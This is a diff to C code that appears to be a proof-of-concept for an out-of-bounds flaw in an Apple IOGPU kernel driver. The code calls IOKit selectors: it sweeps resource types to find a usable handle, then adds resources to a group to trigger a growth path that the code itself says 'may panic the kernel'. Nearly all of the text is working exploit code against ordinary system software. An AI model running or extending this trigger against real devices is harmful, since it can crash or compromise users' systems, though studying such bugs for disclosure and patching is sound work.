@@ -144,18 +144,35 @@ void nk_iogpu_group_oob_run(int trigger)
         }
     }
 
-    /* ---- step 1: new_resource (cmd 0) with capacity 64 ---- */
-    ol("[grp] STEP 1 new_resource cmd=0 cap=64");
-    int kr = call_sel(conn, CMD_NEW_RESOURCE, 64, 0, 0, 0, out, &on);
-    ol("[grp] STEP 1 -> kr=0x%x outN=%zu", kr, on);
+    /* ---- step 1: find a resource type that can be CREATED.
+       struct[0] is the resource TYPE, not an opcode:
+         type 3   -> group      (cmd 130 uses it to add resources)
+         type %16==0 -> alt path: a lookup by index (struct[72] vs a bound),
+                        which is why cmd 0 answered kIOReturnNoResources.
+       We sweep the type and keep the first call that succeeds and hands back
+       a small integer - that integer is the resource handle cmd 130 wants
+       in struct[56]. */
     uint64_t handle = 0;
-    for (uint32_t w = 0; w + 8 <= 0x40 && w < on; w += 8) {
-        uint64_t v = 0;
-        memcpy(&v, out + w, 8);
-        ol("[grp]   out[+0x%02x]=0x%016llx", w, (unsigned long long)v);
-        if (!handle && v && v < 0x1000) handle = v;
+    uint32_t res_type = 0;
+    int kr = 0;
+    for (uint32_t t = 1; t <= 16; t++) {
+        if (t == 3 || t == 130) continue;
+        ol("[grp] STEP 1 try resource type=%u", t);
+        kr = call_sel(conn, t, 64, 0x1000, 0, 0, out, &on);
+        ol("[grp] STEP 1 type=%u -> kr=0x%x outN=%zu", t, kr, on);
+        if (kr != 0) continue;
+        uint64_t cand = 0;
+        for (uint32_t w = 0; w + 8 <= 0x40 && w < on; w += 8) {
+            uint64_t v = 0;
+            memcpy(&v, out + w, 8);
+            ol("[grp]   out[+0x%02x]=0x%016llx", w, (unsigned long long)v);
+            if (!cand && v && v < 0x10000) cand = v;
+        }
+        if (cand) { handle = cand; res_type = t; break; }
     }
-    ol("[grp] STEP 1 handle candidate = 0x%llx", (unsigned long long)handle);
+    ol("[grp] STEP 1 result: resource type=%u handle=0x%llx",
+       res_type, (unsigned long long)handle);
+    if (!handle) ol("[grp] STEP 1: no resource type produced a handle");
 
     /* ---- step 2: new group (cmd 3) with capacity 64 ---- */
     ol("[grp] STEP 2 new_group cmd=3 cap=64");
@@ -193,7 +210,7 @@ void nk_iogpu_group_oob_run(int trigger)
     /* ---- step 3: add the resource to the group -> growth path ---- */
     ol("[grp] TRIGGER: adding the resource to the group; this may panic the kernel");
     for (uint32_t h = 0; h < 12; h++) {
-        uint64_t cand = h == 0 ? handle : h;
+        uint64_t cand = (h == 0) ? handle : h;
         ol("[grp] STEP 3 add_resource cmd=130 handle=%llu", (unsigned long long)cand);
         kr = call_sel(conn, CMD_ADD_RES, cand, 1, 0, 0, out, &on);
         ol("[grp] STEP 3 -> kr=0x%x outN=%zu", kr, on);
